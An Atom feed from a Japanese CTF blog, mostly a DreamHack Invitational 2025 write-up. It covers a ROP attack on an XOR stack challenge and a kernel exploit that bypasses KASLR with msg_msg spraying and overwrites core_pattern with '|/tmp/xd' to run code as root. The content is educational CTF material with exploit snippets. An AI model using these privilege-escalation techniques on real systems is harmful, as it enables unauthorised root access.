@@ -1,0 +1,153 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ja">
+    <title>House-of-Rona - ROP</title>
+    <subtitle>Ronaの雑記</subtitle>
+    <link href="https://blog.rqda.wtf/tags/rop/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://blog.rqda.wtf"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2025-04-09T00:00:00+00:00</updated>
+    <id>https://blog.rqda.wtf/tags/rop/atom.xml</id>
+    <entry xml:lang="ja">
+        <title>Writeup of DreamHack Invitational 2025</title>
+        <published>2025-04-09T00:00:00+00:00</published>
+        <updated>2025-04-09T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://blog.rqda.wtf/dreamhack-inv-2025/" type="text/html"/>
+        <id>https://blog.rqda.wtf/dreamhack-inv-2025/</id>
+        
+        <content type="html">&lt;h1 id=&quot;xoronly&quot;&gt;xoronly&lt;&#x2F;h1&gt;
+&lt;p&gt;stack上に無限に書き込むことができます。書き込みは既にある値とxorが取られれます。xor後の文字列は&lt;code&gt;puts&lt;&#x2F;code&gt;されます。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;challenge&quot;&gt;challenge&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; buf[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x100&lt;&#x2F;span&gt;&lt;span&gt;] = {&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;,};
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stdin, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stdout, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stderr, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Welcome to the XOR-only encryption service!&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;We will encrypt your data with a single byte key.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Please enter your data&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;    {
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;; i++)
+&lt;&#x2F;span&gt;&lt;span&gt;        {
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; c = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;getchar&lt;&#x2F;span&gt;&lt;span&gt;();
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(c == &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span&gt;            {
+&lt;&#x2F;span&gt;&lt;span&gt;                buf[i] = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;            }
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isalnum&lt;&#x2F;span&gt;&lt;span&gt;(c))
+&lt;&#x2F;span&gt;&lt;span&gt;            {
+&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Invalid character detected!&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;            }
+&lt;&#x2F;span&gt;&lt;span&gt;            buf[i] ^= c;
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Here is your encrypted data: &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(buf);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;exploit&quot;&gt;exploit&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;aslr-leak&quot;&gt;aslr leak&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;code&gt;__libc_start_main&lt;&#x2F;code&gt;のアドレスを&lt;code&gt;puts(buf)&lt;&#x2F;code&gt;でleakします。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;rop&quot;&gt;ROP&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;code&gt;[0x00, 0-9, A-z]&lt;&#x2F;code&gt;が入力できて、xorすることができるので、&lt;code&gt;0 - 0x7f&lt;&#x2F;code&gt;までの任意の数値を作り出せます。
+後はlibcのアドレスが&lt;code&gt;0x00 - 0x7f&lt;&#x2F;code&gt;までで構成されるアドレスになるまで接続を繰り返すことで、&lt;code&gt;pop rdi; system&lt;&#x2F;code&gt;のROPをします。&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;kidheap&quot;&gt;kidheap&lt;&#x2F;h1&gt;
+&lt;p&gt;WIP&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;ainque&quot;&gt;ainque&lt;&#x2F;h1&gt;
+&lt;p&gt;The provided kernel module can load riscv ELF binary and run it in kernel context.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;vulnerability&quot;&gt;vulnerability&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;code&gt;pml4e_index&lt;&#x2F;code&gt; has no validation. It can exceed 0x200, which cause OOB access. &lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;static&lt;&#x2F;span&gt;&lt;span&gt; QCPU_EXIT_TYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;write_memory&lt;&#x2F;span&gt;&lt;span&gt;(qvm_t *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;qvm&lt;&#x2F;span&gt;&lt;span&gt;, uint64_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;va&lt;&#x2F;span&gt;&lt;span&gt;, uint64_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;size&lt;&#x2F;span&gt;&lt;span&gt;, uint64_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;bool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;is_signed&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; i&amp;lt;size; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;        qcpu_pte_or_fail pte_safe = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;qcpu_get_pte_from_va_failsafe&lt;&#x2F;span&gt;&lt;span&gt;(qvm-&amp;gt;qcpu.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cr3&lt;&#x2F;span&gt;&lt;span&gt;, va+i);
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(pte_safe.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;success&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;            ((uint8_t *)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PTE_TO_PHYS&lt;&#x2F;span&gt;&lt;span&gt;(pte_safe.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pte&lt;&#x2F;span&gt;&lt;span&gt;))[(va+i) &amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xfff&lt;&#x2F;span&gt;&lt;span&gt;] = (uint8_t)((value &amp;gt;&amp;gt; (i*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;)) &amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xff&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; QCPU_SIGSEGV;
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; QCPU_CONTINUE;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;qcpu_pte_or_fail &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;qcpu_get_pte_from_va_failsafe&lt;&#x2F;span&gt;&lt;span&gt;(qcpu_pte_t ****&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cr3&lt;&#x2F;span&gt;&lt;span&gt;, uint64_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;va&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;    qcpu_pte_t ***pml4e = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;qcpu_get_pml4e&lt;&#x2F;span&gt;&lt;span&gt;(cr3, va &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;39&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; the following omitted
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;qcpu_pte_t ***&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;qcpu_get_pml4e&lt;&#x2F;span&gt;&lt;span&gt;(qcpu_pte_t ****cr3, uint64_t pml4e_index)
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; cr3[pml4e_index];
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;exploit-1&quot;&gt;exploit&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;kaslr-bypass&quot;&gt;kaslr bypass&lt;&#x2F;h3&gt;
+&lt;p&gt;The basic strategy is spraying &lt;code&gt;msg_msg&lt;&#x2F;code&gt; and use it as &lt;code&gt;cr3&lt;&#x2F;code&gt;.
+&lt;code&gt;msg_msg&lt;&#x2F;code&gt; has &lt;code&gt;list_head&lt;&#x2F;code&gt; member, which has a valid pointer, they can be used as &lt;code&gt;pml4e&lt;&#x2F;code&gt; or &lt;code&gt;pdpe&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;We can leak kbase by reading IDT region, which is located at fixed virtual address.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; VM side
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned long&lt;&#x2F;span&gt;&lt;span&gt; gate = *(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;long &lt;&#x2F;span&gt;&lt;span&gt;*)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PTI_TO_VIRT&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x2000 &lt;&#x2F;span&gt;&lt;span&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;52&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned long&lt;&#x2F;span&gt;&lt;span&gt; kbase_diff = gate - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x820&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;To load crafted value as &lt;code&gt;pml4e&lt;&#x2F;code&gt;, spray a bunch of &lt;code&gt;msg_msg&lt;&#x2F;code&gt; struct after &lt;code&gt;QVM_LOAD&lt;&#x2F;code&gt;. It contains the all possible pointer (0x200) pointing to &lt;code&gt;&amp;amp;core_pattern&lt;&#x2F;code&gt; considering KASLR.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Host side
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rep&lt;&#x2F;span&gt;&lt;span&gt;(i, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1f8&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;    ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned long &lt;&#x2F;span&gt;&lt;span&gt;*)msg_buf.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mtext&lt;&#x2F;span&gt;&lt;span&gt;)[i + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] =
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xffffffff&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lu &lt;&#x2F;span&gt;&lt;span&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x100000
+&lt;&#x2F;span&gt;&lt;span&gt;    | (i + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x82b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lu&lt;&#x2F;span&gt;&lt;span&gt;) * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lu  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; KASLR bypass
+&lt;&#x2F;span&gt;&lt;span&gt;    | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x7b
+&lt;&#x2F;span&gt;&lt;span&gt;    | (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x8000000000000000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;l&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+
+&lt;div class=&quot;inserted_img&quot;&gt;
+    &lt;img src=&quot;https:&amp;#x2F;&amp;#x2F;blog.rqda.wtf&amp;#x2F;processed_images&amp;#x2F;pagetable.4a55090bc5dac5ad.png&quot; alt=&quot;&quot;&#x2F;&gt;
+    &lt;p&gt;IDT address and all possible kbase address&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;
+&lt;h3 id=&quot;core-pattern-overwrite&quot;&gt;core_pattern overwrite&lt;&#x2F;h3&gt;
+&lt;p&gt;By writing &lt;code&gt;|&#x2F;tmp&#x2F;xd&lt;&#x2F;code&gt; into &lt;code&gt;core_pattern&lt;&#x2F;code&gt; and causing crash, the kernel executes &lt;code&gt;&#x2F;tmp&#x2F;xd&lt;&#x2F;code&gt; as root.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; VM side
+&lt;&#x2F;span&gt;&lt;span&gt;  *(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;long &lt;&#x2F;span&gt;&lt;span&gt;*)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PTI_TO_VIRT&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x2000 &lt;&#x2F;span&gt;&lt;span&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;7 &lt;&#x2F;span&gt;&lt;span&gt;+ kbase_diff &amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xfff&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xc20&lt;&#x2F;span&gt;&lt;span&gt;) =
+&lt;&#x2F;span&gt;&lt;span&gt;      0x64782f706d742f7c; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; |&#x2F;tmp&#x2F;xd
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="ja">
+        <title>CakeCTF 2023</title>
+        <published>2023-11-19T00:00:00+00:00</published>
+        <updated>2023-11-19T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://blog.rqda.wtf/cake-2023/" type="text/html"/>
+        <id>https://blog.rqda.wtf/cake-2023/</id>
+        
+        <summary type="html">&lt;p&gt;CakeCTFにTPCとして参加しました。&lt;&#x2F;p&gt;
+</summary>
+        
+    </entry>
+    <entry xml:lang="ja">
+        <title>vsctf 2023 | llm-wrapper</title>
+        <published>2023-09-29T00:00:00+00:00</published>
+        <updated>2023-09-29T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://blog.rqda.wtf/vsctf-2023/" type="text/html"/>
+        <id>https://blog.rqda.wtf/vsctf-2023/</id>
+        
+        <summary type="html">&lt;p&gt;C++の問題が解きたかったので、&lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2053&quot;&gt;vsctf&lt;&#x2F;a&gt;のllm-wrapperを解きました。&lt;&#x2F;p&gt;
+</summary>
+        
+    </entry>
+</feed>
